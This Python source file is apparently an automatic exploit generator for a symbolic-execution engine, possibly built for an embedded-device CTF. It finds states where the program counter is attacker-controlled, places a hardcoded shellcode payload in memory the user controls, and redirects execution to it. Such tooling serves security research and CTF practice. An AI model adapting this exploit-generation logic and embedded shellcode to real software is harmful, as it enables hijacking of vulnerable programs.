from enum import Enum
from z3 import simplify, is_bv, BitVecNumRef

class VulnReason(Enum):
    """
    Enumerate reasons we thing we can exploit a program
    """
    SYMBOLIC_PC = 0


class UnsatExploitError(Exception):
    pass


def is_symbolic(state, val):
    """
    return whether or not a value is symbolic within a state
    """
    if not is_bv(val):
        return False

    val = simplify(val)
    return not isinstance(val, BitVecNumRef)

def is_exploitable(state):
    """
    Return whether a state is symbolic, and why we think it is

    Returns (bool, VulnReason)
    """
    if is_symbolic(state, state.cpu.registers['R0']):
        return True, VulnReason.SYMBOLIC_PC
    return False, None

def is_controllable(state, val):
    """
    Check that :val: is completely user-controlled in state
    """
    # TODO: check state.path.pred() does not constrain val
    # (or we could constrain to 0..255 and check sat?
    return is_symbolic(state, val)

def find_controlled_bytes(state, n_bytes, start):
    """
    Find a region of `n_bytes` consecutive bytes that are totally controllable.
    Start searching at `start`
    """
    for base, _ in enumerate(state.memory[start:], start=start):
        if all(is_symbolic(state, x) for x in state.memory[base : base + n_bytes]):
            return base

    raise UnsatExploitError('COULD NOT FIND CONTROLLED BYTES AT REQUESTED START :cry:!!!')

def constrain_shellcode(state, earliest_shellcode_addr=0x0):
    """
    Find a place in memory where we can put shellcode,
    constrain it to those values, and return (constrained_state, shellcode_start_addr)
    
    earliest_shellcode_addr is the lowest permitted address for shellcode to be stored
    """
    # TODO: Generate this in response to constraints?
    # short, NULL-avoiding shellcode
    shellcode = b'\x7f\x43\x8f\x10\x02\x4f\x33\x12\x7e\x40\x10\xff\x8e\x12'

    constrained_state = state.clone()
    # XXX: Should only be valid if word-aligned!!!
    shellcode_start_addr = find_controlled_bytes(constrained_state, \
            len(shellcode), start=earliest_shellcode_addr)

    # constrain shellcode memory
    for i, val in enumerate(shellcode):
        constrained_state.path.add( \
                constrained_state.memory[shellcode_start_addr + i] == val)

    # TODO: try another place if unsat until we run out of valid locations
    #assert constrained_state.path.is_sat(), \
            #'Could not constrain memory to put shellcode!'

    return constrained_state, shellcode_start_addr

def generate_symbolic_ip_exploit(state):
    """
    Do all the work to setup a state to be exploitable.
    
    You should be able to take the input from this and throw it at the program to get unlock.
    """

    earliest_shellcode_addr = 0x0
    while True:
        print('hunting for shc addr, lowest allowed:', hex(earliest_shellcode_addr))
        constrained_state = state.clone()
        constrained_state, shellcode_addr = constrain_shellcode(constrained_state, \
                earliest_shellcode_addr=earliest_shellcode_addr)
        constrained_state.path.add(constrained_state.cpu.registers['R0'] == shellcode_addr)
        if constrained_state.path.is_sat():
            break
        if earliest_shellcode_addr >= 0xffff:
            raise UnsatExploitError('No valid shellcode locations found in memory :(')

        earliest_shellcode_addr = shellcode_addr + 1
        print('found bad shellcode loc... trying again...')

    if not constrained_state.path.is_sat():
        raise UnsatExploitError('Exploit path was unsat :(')

    return constrained_state

def generate_exploit(state):
    """
    Given a state, return a new state such that the input causes the program to be exploited
    """
    exploitable, vuln_reason = is_exploitable(state)
    assert exploitable

    if vuln_reason == VulnReason.SYMBOLIC_PC:
        return generate_symbolic_ip_exploit(state)
    else:
        raise NotImplementedError('Exploitation for VulnReason:', vuln_reason)
